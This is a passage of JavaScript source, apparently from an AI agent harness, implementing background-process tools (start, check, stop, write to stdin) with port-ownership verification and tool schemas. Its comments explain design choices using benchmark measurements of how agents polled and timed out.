   * the whole reason `check_process` reports an exit code rather than just
   * `running:false`: a server that crashed because the port was taken and a
   * server that is still booting look identical from the outside, and a model
   * that cannot tell them apart waits politely forever for a dead process.
   */
  if (!rec.running) {
    out.exitCode = rec.exitCode;
    out.signal = rec.signal;
    out.note = rec.exitCode === 0
      ? 'it exited cleanly. If you expected a server, it stopped on its own — read the output above.'
      : `it is NOT running: it exited with code ${rec.exitCode}${rec.signal ? ` (signal ${rec.signal})` : ''}. `
        + 'This is a failure to fix, not a slow start — the output above is why.';
    return out;
  }

  if (rec.port !== null) {
    /**
     * ── ⚠️⚠️ THE CLAIM IS CHECKED HERE, BEFORE ANYTHING TOUCHES THE NETWORK ──
     *
     * `rec.port` came out of the child's stdout, so a cloned repository chose
     * it (see `detectPort`). Asking the OS who holds the port is what makes the
     * module header's promise — "a port we started" — actually true.
     *
     * ⚠️ VERIFIED ONCE, THEN REMEMBERED. Each check spawns netstat/ps, and
     * `check_process` is called every round while a server boots. A confirmed
     * ownership does not change (the pid held it and we are still running), so
     * it is cached; a NEGATIVE is not cached, because "nothing is listening
     * yet" is the normal state of a server three seconds into starting.
     */
    if (rec.portOwned !== true) {
      const v = verifyOwner(rec.port, rec.child?.pid ?? null);
      rec.portOwned = v?.owned === true;
      rec.portOwnerWhy = v?.why ?? 'unknown';
      rec.portOwnerVerified = v?.verified === true;
    }

    out.portVerified = rec.portOwned === true;
    if (!rec.portOwned) {
      /**
       * ⚠️ NO PROBE, AND THE REASON IS SAID OUT LOUD. Falling through to the
       * probe "just to be helpful" is precisely the hole: one GET to a port a
       * repository named is a service-existence oracle today, and the same
       * number reaches `http-probe`'s POST path the day that module is wired.
       */
      out.note = `it is running, but the port in its output (${rec.port}) was NOT confirmed to belong to it: `
        + `${rec.portOwnerWhy}. Nothing was probed. `
        + `${STILL_RUNNING_ADVICE}`;
      return out;
    }

    const p = await probe(rec.port);
    out.probe = p;
    out.url = `http://localhost:${rec.port}/`;
    out.note = p?.reachable
      ? `it is listening: HTTP ${p.status} on ${out.url}`
      : `it announced port ${rec.port} but is not answering yet (${p?.why ?? 'unknown'}). ${STILL_RUNNING_ADVICE}`;
  } else {
    out.note = `it is running but has not announced a port yet, and the output above is all there is so far. ${STILL_RUNNING_ADVICE}`;
  }
  return out;
}

/** Stop one. Idempotent: stopping something already gone is a success. */
export function stopBackground(id) {
  const rec = live.get(id);
  if (!rec) return { ok: false, error: `no background process "${id}". Running now: ${[...live.keys()].join(', ') || '(none)'}.` };
  try { killProcessTree(rec.child); } catch { /* already gone */ }
  rec.running = false;
  live.delete(id);
  return { ok: true, id, stopped: true, output: clampOutput(rec.log).text };
}

/** For tests and for the summary — never mutate the returned array. */
/**
 * Read a background process's ring buffer.
 *
 * ⭐⭐ THE LOG TOOLS' MISSING HALF. `runLogTailTool` takes `readLog(id)` by
 * INJECTION so that module never reaches into this registry — a good seam, and
 * for months nothing ever passed through it outside `log-tail.test.mjs`. So
 * `wait_for_output`, `read_log` and `summarize_log` were advertised to the model
 * in every run and refused 100% of them.
 *
 * ⚠️ MEASURED IN A REAL BENCH TRIAL: the agent asked for `wait_for_output` BY
 * NAME, was refused, and fell back to a `sleep N` -> `check_process` ping-pong
 * for 53 of its 84 rounds. An injected dependency nobody injects is not a seam,
 * it is a disconnection with good manners.
 *
 * Shape matches what `normaliseRead` accepts: `{ text, running, exitCode }`, or
 * `{ ok:false, error }` for an id we do not have.
 */
export function readLog(id) {
  const rec = live.get(id);
  /**
   * ⚠️ NAMES WHAT IS AVAILABLE. "no background process" alone sends the model
   * guessing at ids; listing them turns a dead end into the next call.
   */
  if (!rec) {
    const known = [...live.keys()];
    return {
      ok: false,
      error: known.length
        ? `no background process "${id}". Running now: ${known.join(', ')}.`
        : `no background process "${id}" — nothing has been started with start_process in this run.`,
    };
  }
  /**
   * ⚠️ THE RING BUFFER IS RETURNED WHOLE, not tailed. `log-tail.mjs` owns the
   * cursor, the `contains` filter and the truncation — doing any of it here
   * would silently drop the lines a cursor was about to resume from.
   */
  return { text: String(rec.log ?? ''), running: rec.running === true, exitCode: rec.exitCode ?? null };
}
export function listBackground() {
  return [...live.values()].map((r) => ({
    id: r.id, command: r.command, running: r.running, port: r.port, exitCode: r.exitCode,
    /**
     * ⚠️⚠️ CARRIED SO CONSUMERS CANNOT MISS IT. `http-probe.mjs` finds the
     * owner of a port by matching `p.port === wantPort` against this list, and
     * `port` alone is a number a cloned repository printed. Anything that opens
     * a socket must require `portVerified === true`, not merely a match.
     */
    portVerified: r.portOwned === true,
  }));
}

/** Longest single write to a process's stdin. A REPL line, not a file. */
export const MAX_WRITE_CHARS = 4_000;

/**
 * ── ⭐ write_process — TALK TO A RUNNING PROCESS (C1, 2026-09-07) ─────────────
 * Send a line to a background process's stdin: a REPL expression, an answer to
 * a `y/N` prompt, the `r` a dev server wants for a restart. The reply lands in
 * the same log `check_process` / `wait_for_output` read — nothing here waits,
 * because a REPL that prints nothing is not an error. The text sent is recorded
 * in the log as `[stdin] …` so the transcript reads as the dialogue it was.
 *
 * ⚠️ NO PTY. This is a pipe: programs that insist on a terminal (`isatty`
 * checks, raw-mode key handlers) will not see the input, and their output is
 * unpainted — which is exactly what the model should be billed for. The
 * terminal transport was measured and withdrawn (README, `ACUVO_PTY_MODULE`).
 */
export function writeBackground(id, text, { newline = true } = {}) {
  const rec = live.get(id);
  if (!rec) return { ok: false, error: `no background process "${id}" — start one with start_process, or check listBackground for the live ids` };
  if (typeof text !== 'string') return { ok: false, error: 'text must be a string — the line to send, without the newline (one is added unless newline:false)' };
  if (text.length > MAX_WRITE_CHARS) return { ok: false, error: `text is ${text.length} chars; keep a write under ${MAX_WRITE_CHARS} — a process reads lines, not files` };
  if (!rec.running || !rec.child) {
    return { ok: false, id, running: false, exitCode: rec.exitCode, error: `${id} has exited${rec.exitCode == null ? '' : ` with code ${rec.exitCode}`} — there is nothing to write to. Start it again with start_process.` };
  }
  const stdin = rec.child.stdin;
  if (!stdin || stdin.destroyed || !stdin.writable) {
    return { ok: false, id, running: rec.running, error: `${id} is running but its stdin is closed — the program ended its input (or was started without a pipe).` };
  }
  const payload = newline ? `${text}\n` : text;
  try {
    stdin.once?.('error', (e) => record(rec, `\n[stdin error] ${e?.message ?? e}\n`));
    stdin.write(payload);
  } catch (e) {
    return { ok: false, id, error: `could not write to ${id}: ${e?.message ?? e}` };
  }
  record(rec, `\n[stdin] ${text}\n`);
  return {
    ok: true, id, wrote: Buffer.byteLength(payload, 'utf8'),
    note: 'sent. The reply, if any, arrives in the log: read it with wait_for_output (blocks until something prints) or check_process (a snapshot). A REPL that prints nothing is not an error.',
  };
}

export const BACKGROUND_TOOL_NAMES = ['start_process', 'check_process', 'stop_process', 'write_process'];

export function backgroundToolSchemas() {
  return [
    {
      type: 'function',
      function: {
        name: 'start_process',
        /**
         * ── ⚠️⚠️⭐ THE SCHEMA SAID BUILDS WERE OUT OF SCOPE, AND TAUGHT THE POLL ──
         *
         * `startBackground`'s RESULT was fixed to name the blocking verb, and
         * `STILL_RUNNING_ADVICE` below records the 146 `check_process` calls that
         * bought. ⚠️ BUT A RESULT IS READ ONCE AND THIS SCHEMA IS RE-SENT EVERY
         * ROUND, so the old wording outvoted the fix on every task it appeared on.
         * Two sentences were doing the damage:
         *
         *   · *"a build in watch mode … use this for anything that does not exit
         *     on its own"* — a `make` DOES exit on its own, so a model reading
         *     this correctly declined to use the tool for the one job that most
         *     needed it, and sent the compile to `run_command` to be killed.
         *     ⚠️ `wait_for_output`'s schema said the OPPOSITE in the same offer
         *     (*"a BUILD or INSTALL (make, cmake, apt-get, pip, cargo)"*).
         *   · *"Call check_process with that id in a LATER round"* — our own
         *     schema instructing the model to spend a model call on one bit.
         *
         * MEASURED across `bench/terminal-bench/results/` (139 transcripts,
         * 1,903 rounds): `wait_for_output` was called **0 times**; 204 rounds
         * (10.7%) went on `sleep` or a bare `check_process`; 11,078 seconds —
         * 3.1 hours — were spent inside literal `sleep`; and **24 of the 40
         * transcripts that hit a `run_command` timeout never called
         * `start_process` at all.**
         *
         * ⚠️ COSTS +250 BYTES A ROUND, and only on a task offered this group.
         * Priced against 104 killed commands and 61% of all command wall-clock
         * spent earning no exit code, that is the cheapest byte in the file.
         */
        description: [
          'Start a long-running command in the background — a dev server, a watcher, OR a build, install,',
          'compile or training run. Use it for anything that does not exit on its own, AND for anything that',
          'WILL exit but outlasts run_command: run_command kills at its timeout and returns no exit code, so a',
          'server, a make, a cmake, an apt-get or a pip install can only ever time out there.',
          'TWO WAYS TO SAY WHAT TO START, and you must give exactly one.',
          '(1) command: a plain string, e.g. "npm run dev" — same rules and allowlist as run_command, which',
          'means no shell, so a quote, a paren or a program flag like --port is refused.',
          '(2) program + args: a REAL argument array, exactly like run_program — use this whenever any',
          'argument has a space, a quote or a leading dash. program "node", args ["server.mjs","--port","3005"]',
          'is how you start a server on a port you chose; args after the script path are passed to your',
          'program untouched. program "npm", args ["run","dev","--","--port","3005"] passes them to the script.',
          'Returns an id. ⚠️ To WAIT, call wait_for_output — {"id":"bg1","untilExit":true} for a build or',
          'install, {"id":"bg1","contains":"<a line it prints>"} for a server — it blocks inside ONE call and',
          'returns the exit code. check_process is a SINGLE look at the output and the port it bound, never a',
          'polling loop. Everything started this way is killed automatically when this run ends.',
        ].join(' '),
        parameters: {
          type: 'object',
          properties: {
            command: { type: 'string', description: 'The command as ONE string, e.g. "npm run dev". Same rules and allowlist as run_command. Leave this out if you are using program + args.' },
            /**
             * ⚠️ THE ENUM IS GONE FOR THE REASON `spawn-argv.mjs` gives at the
             * same field: it said "Nothing else is reachable" while the `command`
             * form one line above reached make, python, go and cargo, and a model
             * that believes a capability is absent never uses it. `planSingleSpawn`
             * checks the name against the resolved allowlist at dispatch — that
             * is the gate; this was only ever the hint.
             */
            program: { type: 'string', description: 'The argv form: the program to run. node, npm, npx and tsc always, plus whatever this workspace enables — the same allowlist the command form uses.' },
            args: {
              type: 'array',
              items: { type: 'string' },
              description: 'One argument per array item, e.g. ["server.mjs","--port","3005"] or ["run","dev","--","--host"]. Never put two arguments in one string.',
            },
          },
        },
      },
    },
    {
      type: 'function',
      function: {
        name: 'check_process',
        description: [
          'Read what a background process has printed, whether it is still running, and — if it announced',
          'a port — whether it is actually answering HTTP on localhost.',
          'This is how you find out that the server is up before you try to use it, and how you find out it',
          'died on startup instead of waiting for something that is never coming.',
        ].join(' '),
        parameters: {
          type: 'object',
          properties: { id: { type: 'string', description: 'The id returned by start_process, e.g. "bg1".' } },
          required: ['id'],
        },
      },
    },
    {
      type: 'function',
      function: {
        name: 'stop_process',
        description: 'Stop a background process and everything it started. Returns its final output.',
        parameters: {
          type: 'object',
          properties: { id: { type: 'string', description: 'The id returned by start_process.' } },
          required: ['id'],
        },
      },
    },
    {
      type: 'function',
      function: {
        name: 'write_process',
        description: [
          'Send one line to a running background process\'s stdin — a REPL expression, the answer to a y/N prompt, the key a dev server asks for.',
          'A newline is added unless newline is false. Nothing waits: read the reply with wait_for_output or check_process.',
          'It is a pipe, not a terminal — programs that insist on a TTY will not see it.',
        ].join(' '),
        parameters: {
          type: 'object',
          properties: {
            id: { type: 'string', description: 'The id returned by start_process, e.g. "bg1".' },
            text: { type: 'string', description: 'The line to send, without a trailing newline.' },
            newline: { type: 'boolean', description: 'Add a newline after text (default true). Set false to send a bare keypress.' },
          },
          required: ['id', 'text'],
        },
      },
    },
  ];
}

/** Dispatch. Mirrors the shape every other tool module in this package uses. */
export async function runBackgroundTool(name, args = {}, { executor, shell = false, env = process.env } = {}) {
  switch (name) {
    case 'start_process':
      /**
       * ⚠️ NOT `String(args.command ?? '')` ANY MORE. Coercing an absent
       * `command` to `''` made "no command given" indistinguishable from "the
       * empty command", and with two input forms that difference is the whole
       * decision — `startBackground` has to be able to see that the caller sent
       * `program` instead. Passed through as-is; the refusals live there.
       */
      return startBackground({
        command: args.command,
        program: args.program,
        args: args.args,
        executor,
        shell,
        env,
      });
    case 'check_process':
      return checkBackground(String(args.id ?? ''));
    case 'stop_process':
      return stopBackground(String(args.id ?? ''));
    case 'write_process':
      return writeBackground(String(args.id ?? ''), args.text, { newline: args.newline !== false });
    default:
      return { ok: false, error: `unknown background tool "${name}"` };
  }
}
